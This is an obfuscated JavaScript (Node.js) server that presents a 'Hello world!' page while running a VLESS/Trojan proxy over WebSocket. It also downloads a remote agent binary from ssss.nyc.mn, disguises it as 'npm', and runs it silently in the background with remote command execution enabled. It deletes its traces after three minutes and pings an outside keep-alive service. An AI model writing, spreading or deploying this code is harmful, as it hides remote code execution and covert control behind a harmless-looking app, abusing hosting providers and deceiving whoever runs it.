const _0x20569f=_0x20c3;function _0x3050(){const _0x372c62=['readUInt16BE','client_secret:\x20','concat','find','DOMAIN','&fp=chrome&type=ws&host=','Automatic\x20Access\x20Task\x20added\x20successfully','366kTJIWA','npm\x20download\x20successfully','2096','env','Server\x20is\x20running\x20on\x20port\x20','split','update','replace','Not\x20Found\x0a','application/json','map','Answer','setsid\x20nohup\x20./npm\x20-s\x20','test','path','https://amd64.ssss.nyc.mn/agent','443','crypto','decode','8.8.4.4','send','arch','substr','error','post','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Server','https://oooo.serv00.net/add-url','--tls','132125srhEFi','finish','5729128zMfQvb',':443?encryption=none&security=tls&sni=','error:\x20','npm','\x20-p\x20','log','arm','writeHead','1.1.1.1','utf8','stream','createHash','text/plain','250xNmYLG','net','config.yaml','write','http','14724585sgBUbg','catch','url','Hug','Failed\x20to\x20resolve\x20','pipe','https://arm64.ssss.nyc.mn/v1','every','690767pNTLsp','writeFileSync','NEZHA_PORT','listen','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','once','SUB_PATH','createWriteStream','axios','join','message','https://speed.cloudflare.com/meta','npm\x20is\x20already\x20running,\x20skip\x20running...','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://arm64.ssss.nyc.mn/agent','false','2087','data','npm\x20is\x20running','Unknown','close','unlink','13088nfApTA','reduce','WSPATH','country','1216000JUXult','utf-8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1296CxyMVF','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','slice','from','length','\x20with\x20all\x20DNS\x20servers','then','NEZHA_SERVER','arm64','digest','3840LweInv','pop','spv','readUInt8',':443?security=tls&sni=','connect','AUTO_ACCESS','end','715abf30-2577-8d99-6d76-8d60cea59ab5','aarch64','UUID','PORT','Hello\x20world!','includes','readFile','buffer','trim','sha224','vless://','NEZHA_KEY','get','true','https://amd64.ssss.nyc.mn/v1','6139bBAcWf','&path=%2F','/bin/bash','toString'];_0x3050=function(){return _0x372c62;};return _0x3050();}(function(_0x32d7fc,_0x590195){const _0x49c94d=_0x20c3,_0x2d3aef=_0x32d7fc();while(!![]){try{const _0x579812=-parseInt(_0x49c94d(0x1f5))/0x1+parseInt(_0x49c94d(0x1f8))/0x2*(parseInt(_0x49c94d(0x204))/0x3)+parseInt(_0x49c94d(0x245))/0x4+parseInt(_0x49c94d(0x243))/0x5*(-parseInt(_0x49c94d(0x226))/0x6)+parseInt(_0x49c94d(0x21b))/0x7*(parseInt(_0x49c94d(0x1f1))/0x8)+parseInt(_0x49c94d(0x257))/0x9+parseInt(_0x49c94d(0x252))/0xa*(-parseInt(_0x49c94d(0x25f))/0xb);if(_0x579812===_0x590195)break;else _0x2d3aef['push'](_0x2d3aef['shift']());}catch(_0x43f97f){_0x2d3aef['push'](_0x2d3aef['shift']());}}}(_0x3050,0xe4335));const os=require('os'),http=require(_0x20569f(0x256)),fs=require('fs'),axios=require(_0x20569f(0x267)),net=require(_0x20569f(0x253)),dns=require('dns'),path=require(_0x20569f(0x234)),crypto=require(_0x20569f(0x237)),{Buffer}=require(_0x20569f(0x213)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x20569f(0x229)][_0x20569f(0x20e)]||_0x20569f(0x20c),NEZHA_SERVER=process['env'][_0x20569f(0x201)]||'',NEZHA_PORT=process[_0x20569f(0x229)][_0x20569f(0x261)]||'',NEZHA_KEY=process[_0x20569f(0x229)][_0x20569f(0x217)]||'',DOMAIN=process['env'][_0x20569f(0x223)]||'hf-mirror.edisonhu.de5.net',AUTO_ACCESS=process[_0x20569f(0x229)][_0x20569f(0x20a)]||!![],WSPATH=process[_0x20569f(0x229)][_0x20569f(0x1f3)]||UUID[_0x20569f(0x1fc)](0x0,0x8),SUB_PATH=process[_0x20569f(0x229)][_0x20569f(0x265)]||_0x20569f(0x206),NAME=process[_0x20569f(0x229)]['NAME']||_0x20569f(0x25a),PORT=process[_0x20569f(0x229)][_0x20569f(0x20f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3deb0e=_0x20569f;try{const _0xca9898=await axios[_0x3deb0e(0x218)](_0x3deb0e(0x26a)),_0xded828=_0xca9898[_0x3deb0e(0x270)];ISP=(_0xded828[_0x3deb0e(0x1f4)]+'-'+_0xded828['asOrganization'])['replace'](/ /g,'_');}catch(_0x144861){ISP=_0x3deb0e(0x272);}};GetISP();function _0x20c3(_0x5d3378,_0x2bb403){_0x5d3378=_0x5d3378-0x1f1;const _0x3050b3=_0x3050();let _0x20c32b=_0x3050b3[_0x5d3378];return _0x20c32b;}const httpServer=http['createServer']((_0xbcdb7e,_0x28487e)=>{const _0x5ba1f0=_0x20569f;if(_0xbcdb7e['url']==='/'){const _0x563567=path[_0x5ba1f0(0x268)](__dirname,'index.html');fs[_0x5ba1f0(0x212)](_0x563567,_0x5ba1f0(0x24e),(_0x22b75e,_0xd2355d)=>{const _0x587ed0=_0x5ba1f0;if(_0x22b75e){_0x28487e['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x28487e[_0x587ed0(0x20b)](_0x587ed0(0x210));return;}_0x28487e[_0x587ed0(0x24c)](0xc8,{'Content-Type':'text/html'}),_0x28487e['end'](_0xd2355d);});return;}else{if(_0xbcdb7e[_0x5ba1f0(0x259)]==='/'+SUB_PATH){const _0x364f8b=_0x5ba1f0(0x216)+UUID+'@'+DOMAIN+_0x5ba1f0(0x246)+DOMAIN+_0x5ba1f0(0x224)+DOMAIN+_0x5ba1f0(0x21c)+WSPATH+'#'+NAME+'-'+ISP,_0x3c2369='trojan://'+UUID+'@'+DOMAIN+_0x5ba1f0(0x208)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5ba1f0(0x21c)+WSPATH+'#'+NAME+'-'+ISP,_0x322f26=_0x364f8b+'\x0a'+_0x3c2369,_0x5ac4da=Buffer[_0x5ba1f0(0x1fd)](_0x322f26)[_0x5ba1f0(0x21e)]('base64');_0x28487e[_0x5ba1f0(0x24c)](0xc8,{'Content-Type':_0x5ba1f0(0x251)}),_0x28487e[_0x5ba1f0(0x20b)](_0x5ac4da+'\x0a');}else _0x28487e[_0x5ba1f0(0x24c)](0x194,{'Content-Type':_0x5ba1f0(0x251)}),_0x28487e[_0x5ba1f0(0x20b)](_0x5ba1f0(0x22e));}}),wss=new WebSocket[(_0x20569f(0x240))]({'server':httpServer}),uuid=UUID[_0x20569f(0x22d)](/-/g,''),DNS_SERVERS=[_0x20569f(0x239),_0x20569f(0x24d)];function resolveHost(_0x32112e){return new Promise((_0x92b56b,_0x4c8b2c)=>{const _0x119b38=_0x20c3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x119b38(0x233)](_0x32112e)){_0x92b56b(_0x32112e);return;}let _0x4fcdd8=0x0;function _0x5a5cb6(){const _0x2f0203=_0x119b38;if(_0x4fcdd8>=DNS_SERVERS[_0x2f0203(0x1fe)]){_0x4c8b2c(new Error(_0x2f0203(0x25b)+_0x32112e+_0x2f0203(0x1ff)));return;}const _0x44dcb4=DNS_SERVERS[_0x4fcdd8];_0x4fcdd8++;dns.setServers([_0x44dcb4]);dns.resolve4(_0x32112e,{'ttl':true},(_0x23d5a9,_0x34fad7)=>{if(_0x23d5a9){_0x5a5cb6();return;}if(_0x34fad7&&_0x34fad7['length']>0x0){_0x92b56b(_0x34fad7[0x0]['address']);return;}_0x5a5cb6();});}_0x5a5cb6();});}function handleVlessConnection(_0x649a2d,_0x1562ee){const _0x1be470=_0x20569f,[_0x23c863]=_0x1562ee,_0x8bb907=_0x1562ee['slice'](0x1,0x11);if(!_0x8bb907[_0x1be470(0x25e)]((_0x3644e5,_0x41cd36)=>_0x3644e5==parseInt(uuid[_0x1be470(0x23c)](_0x41cd36*0x2,0x2),0x10)))return![];let _0x158291=_0x1562ee[_0x1be470(0x1fc)](0x11,0x12)['readUInt8']()+0x13;const _0x3f6b9e=_0x1562ee[_0x1be470(0x1fc)](_0x158291,_0x158291+=0x2)[_0x1be470(0x21f)](0x0),_0x4ade70=_0x1562ee['slice'](_0x158291,_0x158291+=0x1)[_0x1be470(0x207)](),_0x4eaae6=_0x4ade70==0x1?_0x1562ee['slice'](_0x158291,_0x158291+=0x4)[_0x1be470(0x268)]('.'):_0x4ade70==0x2?new TextDecoder()[_0x1be470(0x238)](_0x1562ee[_0x1be470(0x1fc)](_0x158291+0x1,_0x158291+=0x1+_0x1562ee['slice'](_0x158291,_0x158291+0x1)['readUInt8']())):_0x4ade70==0x3?_0x1562ee[_0x1be470(0x1fc)](_0x158291,_0x158291+=0x10)[_0x1be470(0x1f2)]((_0x43fafa,_0x2202aa,_0x58e531,_0x3aa0fc)=>_0x58e531%0x2?_0x43fafa[_0x1be470(0x221)](_0x3aa0fc[_0x1be470(0x1fc)](_0x58e531-0x1,_0x58e531+0x1)):_0x43fafa,[])['map'](_0x33c944=>_0x33c944[_0x1be470(0x21f)](0x0)[_0x1be470(0x21e)](0x10))[_0x1be470(0x268)](':'):'';_0x649a2d[_0x1be470(0x23a)](new Uint8Array([_0x23c863,0x0]));const _0x2873d3=createWebSocketStream(_0x649a2d);return resolveHost(_0x4eaae6)[_0x1be470(0x200)](_0x52270e=>{const _0x57e76a=_0x1be470;net[_0x57e76a(0x209)]({'host':_0x52270e,'port':_0x3f6b9e},function(){const _0x44ee81=_0x57e76a;this['write'](_0x1562ee[_0x44ee81(0x1fc)](_0x158291)),_0x2873d3['on'](_0x44ee81(0x23d),()=>{})[_0x44ee81(0x25c)](this)['on'](_0x44ee81(0x23d),()=>{})[_0x44ee81(0x25c)](_0x2873d3);})['on'](_0x57e76a(0x23d),()=>{});})[_0x1be470(0x258)](_0x161197=>{const _0x78a6d7=_0x1be470;net[_0x78a6d7(0x209)]({'host':_0x4eaae6,'port':_0x3f6b9e},function(){const _0x55c84a=_0x78a6d7;this[_0x55c84a(0x255)](_0x1562ee['slice'](_0x158291)),_0x2873d3['on'](_0x55c84a(0x23d),()=>{})['pipe'](this)['on'](_0x55c84a(0x23d),()=>{})[_0x55c84a(0x25c)](_0x2873d3);})['on'](_0x78a6d7(0x23d),()=>{});}),!![];}function handleTrojanConnection(_0x1ae912,_0x450708){const _0x101acc=_0x20569f;try{if(_0x450708[_0x101acc(0x1fe)]<0x3a)return![];const _0x2bb901=_0x450708[_0x101acc(0x1fc)](0x0,0x38)[_0x101acc(0x21e)](),_0x56f96d=[UUID];let _0x33f92b=null;for(const _0x541cbd of _0x56f96d){const _0x16c4e4=crypto[_0x101acc(0x250)](_0x101acc(0x215))[_0x101acc(0x22c)](_0x541cbd)[_0x101acc(0x203)]('hex');if(_0x16c4e4===_0x2bb901){_0x33f92b=_0x541cbd;break;}}if(!_0x33f92b)return![];let _0x1278e9=0x38;_0x450708[_0x1278e9]===0xd&&_0x450708[_0x1278e9+0x1]===0xa&&(_0x1278e9+=0x2);const _0x37e3e5=_0x450708[_0x1278e9];if(_0x37e3e5!==0x1)return![];_0x1278e9+=0x1;const _0x582af1=_0x450708[_0x1278e9];_0x1278e9+=0x1;let _0x18838a,_0x525d42;if(_0x582af1===0x1)_0x18838a=_0x450708['slice'](_0x1278e9,_0x1278e9+0x4)[_0x101acc(0x268)]('.'),_0x1278e9+=0x4;else{if(_0x582af1===0x3){const _0xb1d4d9=_0x450708[_0x1278e9];_0x1278e9+=0x1,_0x18838a=_0x450708['slice'](_0x1278e9,_0x1278e9+_0xb1d4d9)[_0x101acc(0x21e)](),_0x1278e9+=_0xb1d4d9;}else{if(_0x582af1===0x4)_0x18838a=_0x450708[_0x101acc(0x1fc)](_0x1278e9,_0x1278e9+0x10)[_0x101acc(0x1f2)]((_0x21e0f1,_0x29322e,_0xb98d07,_0x48b4af)=>_0xb98d07%0x2?_0x21e0f1[_0x101acc(0x221)](_0x48b4af[_0x101acc(0x1fc)](_0xb98d07-0x1,_0xb98d07+0x1)):_0x21e0f1,[])[_0x101acc(0x230)](_0x1bc80f=>_0x1bc80f[_0x101acc(0x21f)](0x0)[_0x101acc(0x21e)](0x10))[_0x101acc(0x268)](':'),_0x1278e9+=0x10;else return![];}}_0x525d42=_0x450708[_0x101acc(0x21f)](_0x1278e9),_0x1278e9+=0x2;_0x1278e9<_0x450708['length']&&_0x450708[_0x1278e9]===0xd&&_0x450708[_0x1278e9+0x1]===0xa&&(_0x1278e9+=0x2);const _0x54e3fe=createWebSocketStream(_0x1ae912);return resolveHost(_0x18838a)[_0x101acc(0x200)](_0x368459=>{const _0x2c1e0b=_0x101acc;net[_0x2c1e0b(0x209)]({'host':_0x368459,'port':_0x525d42},function(){const _0x41ed34=_0x2c1e0b;_0x1278e9<_0x450708['length']&&this[_0x41ed34(0x255)](_0x450708[_0x41ed34(0x1fc)](_0x1278e9)),_0x54e3fe['on']('error',()=>{})['pipe'](this)['on'](_0x41ed34(0x23d),()=>{})['pipe'](_0x54e3fe);})['on'](_0x2c1e0b(0x23d),()=>{});})[_0x101acc(0x258)](_0x36dc00=>{const _0x4d3daf=_0x101acc;net[_0x4d3daf(0x209)]({'host':_0x18838a,'port':_0x525d42},function(){const _0x36c6ff=_0x4d3daf;_0x1278e9<_0x450708[_0x36c6ff(0x1fe)]&&this['write'](_0x450708[_0x36c6ff(0x1fc)](_0x1278e9)),_0x54e3fe['on'](_0x36c6ff(0x23d),()=>{})[_0x36c6ff(0x25c)](this)['on']('error',()=>{})['pipe'](_0x54e3fe);})['on'](_0x4d3daf(0x23d),()=>{});}),!![];}catch(_0x31cee6){return![];}}wss['on']('connection',(_0x525fe5,_0x22d8f7)=>{const _0x1320ee=_0x20569f,_0x80cb6b=_0x22d8f7[_0x1320ee(0x259)]||'';_0x525fe5[_0x1320ee(0x264)](_0x1320ee(0x269),_0x473db5=>{const _0x3e2062=_0x1320ee;if(_0x473db5[_0x3e2062(0x1fe)]>0x11&&_0x473db5[0x0]===0x0){const _0x1d4640=_0x473db5[_0x3e2062(0x1fc)](0x1,0x11),_0xbc907c=_0x1d4640[_0x3e2062(0x25e)]((_0x3e6091,_0x313233)=>_0x3e6091==parseInt(uuid[_0x3e2062(0x23c)](_0x313233*0x2,0x2),0x10));if(_0xbc907c){!handleVlessConnection(_0x525fe5,_0x473db5)&&_0x525fe5[_0x3e2062(0x273)]();return;}}!handleTrojanConnection(_0x525fe5,_0x473db5)&&_0x525fe5[_0x3e2062(0x273)]();})['on'](_0x1320ee(0x23d),()=>{});});const getDownloadUrl=()=>{const _0x3a208f=_0x20569f,_0x1e12b3=os[_0x3a208f(0x23b)]();return _0x1e12b3===_0x3a208f(0x24b)||_0x1e12b3===_0x3a208f(0x202)||_0x1e12b3===_0x3a208f(0x20d)?!NEZHA_PORT?_0x3a208f(0x25d):_0x3a208f(0x26d):!NEZHA_PORT?_0x3a208f(0x21a):_0x3a208f(0x235);},downloadFile=async()=>{const _0x29f27d=_0x20569f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x297d9d=getDownloadUrl(),_0x1b6946=await axios({'method':_0x29f27d(0x218),'url':_0x297d9d,'responseType':_0x29f27d(0x24f)}),_0x6df4bb=fs[_0x29f27d(0x266)](_0x29f27d(0x248));return _0x1b6946[_0x29f27d(0x270)][_0x29f27d(0x25c)](_0x6df4bb),new Promise((_0x760d02,_0x217a3f)=>{const _0x2f80d9=_0x29f27d;_0x6df4bb['on'](_0x2f80d9(0x244),()=>{const _0x29378e=_0x2f80d9;console[_0x29378e(0x24a)](_0x29378e(0x227)),exec('chmod\x20+x\x20npm',_0x3ea46a=>{if(_0x3ea46a)_0x217a3f(_0x3ea46a);_0x760d02();});}),_0x6df4bb['on'](_0x2f80d9(0x23d),_0x217a3f);});}catch(_0x53a17a){throw _0x53a17a;}},runnz=async()=>{const _0x22a8d5=_0x20569f;try{const _0x4ad78a=execSync(_0x22a8d5(0x26c),{'encoding':_0x22a8d5(0x1f6)});if(_0x4ad78a[_0x22a8d5(0x214)]()!==''){console['log'](_0x22a8d5(0x26b));return;}}catch(_0x5a5f53){}await downloadFile();let _0x248456='',_0xd16f50=[_0x22a8d5(0x236),'8443',_0x22a8d5(0x228),_0x22a8d5(0x26f),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x56a775=_0xd16f50['includes'](NEZHA_PORT)?_0x22a8d5(0x242):'';_0x248456=_0x22a8d5(0x232)+NEZHA_SERVER+':'+NEZHA_PORT+_0x22a8d5(0x249)+NEZHA_KEY+'\x20'+_0x56a775+_0x22a8d5(0x1f9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10a639=NEZHA_SERVER[_0x22a8d5(0x211)](':')?NEZHA_SERVER[_0x22a8d5(0x22b)](':')[_0x22a8d5(0x205)]():'',_0x8130bf=_0xd16f50[_0x22a8d5(0x211)](_0x10a639)?_0x22a8d5(0x219):_0x22a8d5(0x26e),_0x378af5=_0x22a8d5(0x220)+NEZHA_KEY+_0x22a8d5(0x263)+NEZHA_SERVER+_0x22a8d5(0x23f)+_0x8130bf+_0x22a8d5(0x1fb)+UUID;fs[_0x22a8d5(0x260)](_0x22a8d5(0x254),_0x378af5);}_0x248456=_0x22a8d5(0x1f7);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x248456,{'shell':_0x22a8d5(0x21d)},_0x718c08=>{const _0x753c38=_0x22a8d5;if(_0x718c08)console[_0x753c38(0x23d)]('npm\x20running\x20error:',_0x718c08);else console[_0x753c38(0x24a)](_0x753c38(0x271));});}catch(_0x28faca){console[_0x22a8d5(0x23d)](_0x22a8d5(0x247)+_0x28faca);}};async function addAccessTask(){const _0x45a6d5=_0x20569f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x7f3eb3=_0x45a6d5(0x1fa)+DOMAIN;try{const _0x196b30=await axios[_0x45a6d5(0x23e)](_0x45a6d5(0x241),{'url':_0x7f3eb3},{'headers':{'Content-Type':_0x45a6d5(0x22f)}});console[_0x45a6d5(0x24a)](_0x45a6d5(0x225));}catch(_0x2f7167){}}const delFiles=()=>{const _0xd4e3f3=_0x20569f;fs[_0xd4e3f3(0x274)]('npm',()=>{}),fs[_0xd4e3f3(0x274)](_0xd4e3f3(0x254),()=>{});};httpServer[_0x20569f(0x262)](PORT,()=>{const _0x468b89=_0x20569f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x468b89(0x24a)](_0x468b89(0x22a)+PORT);});